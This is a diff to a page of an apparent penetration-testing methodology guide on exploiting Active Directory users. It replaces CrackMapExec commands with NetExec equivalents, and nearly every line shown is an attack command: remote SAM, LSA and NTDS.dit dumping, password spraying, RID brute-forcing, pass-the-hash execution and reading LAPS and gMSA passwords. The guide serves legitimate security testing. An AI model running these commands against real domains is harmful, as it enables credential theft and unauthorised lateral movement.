@@ -5,7 +5,7 @@ category: Methodology
 subcategory: Active Directory Attack
 order: 4
 tags: ["active-directory", "credentials", "dcsync", "pass-the-hash", "pentesting"]
-updated: 2026-04-11
+updated: 2026-04-21
 ---
 
 # Part 4: Exploiting AD Users
@@ -107,10 +107,10 @@ pypykatz lsa minidump lsass.dmp
 ### Remote Dumping
 
 ```bash
-# CrackMapExec — dump SAM, LSA, or NTDS
-crackmapexec smb target -u admin -p pass --sam         # Local accounts
-crackmapexec smb target -u admin -p pass --lsa         # LSA secrets
-crackmapexec smb dc01 -u admin -p pass --ntds          # Full NTDS.dit
+# NetExec (nxc) — dump SAM, LSA, or NTDS
+nxc smb target -u admin -p pass --sam         # Local accounts
+nxc smb target -u admin -p pass --lsa         # LSA secrets
+nxc smb dc01 -u admin -p pass --ntds          # Full NTDS.dit
 
 # Impacket
 secretsdump.py domain.local/admin:pass@target
@@ -138,8 +138,8 @@ Get-ADFineGrainedPasswordPolicy -Filter *
 ### Spraying Tools
 
 ```bash
-# CrackMapExec (respects lockout if you're careful)
-crackmapexec smb dc01 -u users.txt -p 'Spring2026!' --continue-on-success
+# NetExec (respects lockout if you're careful)
+nxc smb dc01 -u users.txt -p 'Spring2026!' --continue-on-success
 
 # Kerbrute (faster — uses Kerberos pre-auth, less likely to trigger lockout logging)
 kerbrute passwordspray -d domain.local --dc dc01 users.txt 'Company2026!'
@@ -157,11 +157,11 @@ kerbrute passwordspray -d domain.local --dc dc01 users.txt 'Company2026!'
 ldapsearch -x -H ldap://dc01 -D "user@domain.local" -w pass \
   -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
 
-# From CrackMapExec
-crackmapexec smb dc01 -u user -p pass --users | awk '{print $5}' > users.txt
+# From NetExec
+nxc smb dc01 -u user -p pass --users | awk '{print $5}' > users.txt
 
 # RID brute-force (no creds needed sometimes)
-crackmapexec smb dc01 -u '' -p '' --rid-brute
+nxc smb dc01 -u '' -p '' --rid-brute
 ```
 
 ---
@@ -179,10 +179,10 @@ wmiexec.py domain.local/admin@target -hashes :NTHASH
 smbexec.py domain.local/admin@target -hashes :NTHASH
 atexec.py domain.local/admin@target -hashes :NTHASH "whoami"
 
-# CrackMapExec
-crackmapexec smb target -u admin -H NTHASH
-crackmapexec smb target -u admin -H NTHASH -x "whoami"
-crackmapexec winrm target -u admin -H NTHASH
+# NetExec
+nxc smb target -u admin -H NTHASH
+nxc smb target -u admin -H NTHASH -x "whoami"
+nxc winrm target -u admin -H NTHASH
 
 # Evil-WinRM
 evil-winrm -i target -u admin -H NTHASH
@@ -254,8 +254,9 @@ Get-DomainUser | ? {$_.description -match "pass|pwd|cred"} | select name, descri
 # Read LAPS password (requires read permission on ms-Mcs-AdmPwd)
 Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
 
-# CrackMapExec
-crackmapexec ldap dc01 -u user -p pass -M laps
+# NetExec — reads LAPS passwords directly
+nxc ldap dc01 -u user -p pass --laps
+nxc ldap dc01 -u user -p pass -M laps
 
 # Who can read LAPS passwords?
 Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"
@@ -267,8 +268,8 @@ Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"
 # If you can read msDS-ManagedPassword attribute
 gMSADumper.py -u user -p pass -d domain.local
 
-# CrackMapExec
-crackmapexec ldap dc01 -u user -p pass --gmsa
+# NetExec
+nxc ldap dc01 -u user -p pass --gmsa
 ```
 
 ### NTDS.dit Offline Extraction
